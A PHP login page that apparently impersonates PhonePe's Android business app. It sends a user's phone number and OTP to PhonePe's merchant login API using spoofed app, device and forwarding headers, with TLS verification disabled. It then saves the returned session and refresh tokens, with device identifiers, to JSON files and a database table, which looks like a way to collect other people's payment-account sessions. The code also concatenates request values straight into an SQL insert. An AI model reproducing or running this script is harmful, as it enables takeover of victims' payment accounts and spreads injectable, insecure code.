<style> 
input[type=text], select {
    width: 100%;
    padding: 12px 20px;
    margin: 8px 0;
    display: inline-block;
    border: 1px solid #ccc;
    border-radius: 4px;
    box-sizing: border-box;
}button[id=button] {
    width: 50%;
    background-color: #4CAF50;
    color: white;
    padding: 14px 20px;
    margin: 8px 0;
    border: none;
    border-radius: 4px;
    cursor: pointer;}input[type=submit]:hover {
    background-color: #45a049;}div {
    border-radius: 5px;
    background-color: #f2f2f2;
    padding: 20px;
}
</style>

<?php
include "../pages/dbInfo.php";

error_reporting(0);
echo "<center>";

function sanitizeInput($input) {
    // Trim the input to remove whitespace
    $input = trim($input);

    // Strip tags to remove any HTML and PHP tags
    $input = strip_tags($input);

    // Convert special characters to HTML entities
    // This prevents attackers from injecting malicious scripts
    $input = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

    return $input;
}


echo "<meta name='viewport' content='width=device-width'>";
$no = filter_var($_REQUEST['no'], FILTER_VALIDATE_INT);
$user_token = filter_var($_REQUEST['user_token'], FILTER_SANITIZE_STRING);
$password = filter_var($_REQUEST['password'], FILTER_SANITIZE_STRING);
$imei = filter_var($_REQUEST['imei'], FILTER_SANITIZE_STRING);
$im = filter_var($_REQUEST['im'], FILTER_SANITIZE_STRING);
$uid = filter_var($_REQUEST['uid'], FILTER_SANITIZE_STRING);
$aid = filter_var($_REQUEST['aid'], FILTER_SANITIZE_STRING);
$uc = filter_var($_REQUEST['uc'], FILTER_SANITIZE_STRING);
$mp = filter_var($_REQUEST['mp'], FILTER_SANITIZE_STRING);
$ipp = filter_var($_REQUEST['ipp'], FILTER_SANITIZE_STRING);


 
 function RandomStriing($length) {
    $keys = array_merge(range('9', '0'), range('a', 'f'));
    for($i=0; $i < $length; $i++) {
        $key .= $keys[array_rand($keys)];
    }
    return $key;
}

 function Randomnng($length) {
    $keys = array_merge(range('1', '7'));
    for($i=0; $i < $length; $i++) {
        $key .= $keys[array_rand($keys)];
    }
    return $key;
}



 $mom = RandomStriing(16);
$mon = RandomStriing(64);



function RandomNumber($length){
$str="";
for($i=0;$i<$length;$i++){
$str.=mt_rand(0,9);
}
return $str;
}
$bb = RandomNumber(4);
$db = RandomNumber(13);
$nom = RandomNumber(19);
 

if(isset($no))
{
        include "cheksum.php";
    function request($url,$data0,$type,$headers,$yes){
        $typee="CURLOPT_$type";
        $ch=curl_init($url);   
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, $typee, 1);      
curl_setopt($ch, CURLOPT_POSTFIELDS, $data0);       
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $type);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
#curl_setopt($ch, CURLOPT_PROXY, "117.160.250.133:81");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');  
curl_setopt($ch, CURLOPT_HEADER, $yes);
 $output1= curl_exec ($ch); 
  return $output1;
  }

   $bbk="/apis/merchant-insights/v3/auth/login";
  $url="https://business-api.phonepe.com$bbk";
 $data0='{"type":"OTP","deviceFingerprint":"'.$im.'","otp":"'.$password.'","token":"'.$aid.'","phoneNumber":"'.$no.'"}';
 $lenth=strlen($data0);

 $checksum=checksum("$bbk$data0");


  $headers = array("x-app-id: bd309814ea4c45078b9b25bd52a576de","x-merchant-id: PHONEPEBUSINESS","x-source-type: PB_APP","x-source-platform: ANDROID","x-source-locale: en","x-source-version: 1290004039","fingerprint: $imei","x-device-fingerprint: '.$im.'","x-app-version: 0.4.39","x-request-sdk-checksum: $checksum","content-type: application/json; charset=utf-8","content-length: $lenth","accept-encoding: gzip","user-agent: okhttp/3.12.13","X-Forwarded-For: $uid");

$userdetils=request($url,$data0,POST,$headers,0);
echo $userdetils;
      $json0=json_decode($userdetils,1);
$userId=$json0["userId"];
$success=$json0["success"];
$token=$json0["token"];
$refreshToken=$json0["refreshToken"];

if($success=="true,"){
    
        echo "<center><b><font color='blue' size='5'>Otp success $success</font><br></center>";
        
        ##########################3
 $data_file="usersdb.json";
$message='';

 $filename="count.json"; 
  if(!file_exists($filename)){ $counter= 0; } else $counter = file_get_contents ($filename); $counter++; file_put_contents($filename, $counter);

$dt=date("d-m-y h:i:s A");

if(!file_exists($data_file))
 { $fh = fopen($data_file, 'w+'); fwrite($fh, $message);
 }

$current_data = file_get_contents($data_file);

$array_data = json_decode($current_data, 1); 

$printdata=array("User"=>"$no||$userId||$token||$refreshToken||$im||$imei||$uid");


$servername = DB_HOST;
$username = DB_USERNAME;
$password = DB_PASSWORD;
$dbname = DB_NAME;
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}


$sql = "INSERT INTO providers (id, no, userId, token, refreshToken, im, imei, uid)
VALUES ('', '$no', '$userId','$token', '$refreshToken', '$im', '$imei', '$uid')";

if ($conn->query($sql) === TRUE) {}


$array_data[$counter] = $printdata; 

$final_data = json_encode($array_data, JSON_PRETTY_PRINT);

if(file_put_contents($data_file, $final_data));
############################3

 $data_file="refresh_Token/$counter.json";
$message='';

$dt=date("d-m-y h:i:s A");

if(!file_exists($data_file))
 { $fh = fopen($data_file, 'w+'); fwrite($fh, $message);
 }

$current_data = file_get_contents($data_file);

$array_data = json_decode($current_data, 1); 

$printdata=($token);

$data= ' {
      "token":"'.$token.'",
      "refreshToken":"'.$refreshToken.'"
   }';


if(file_put_contents($data_file, $data));
    
}else{
    
    
    echo "<center><b><font color='red' size='5'>Otp not_valid</font><br></center>";
}


}

if(!isset($no))
{
echo"<center><br><form action='' method='POST'>

<input  type='text' name='no' placeholder='ENTER Number'><br><br>

<button  id='button'>LogIn</button></form></center>";
}

?>
.
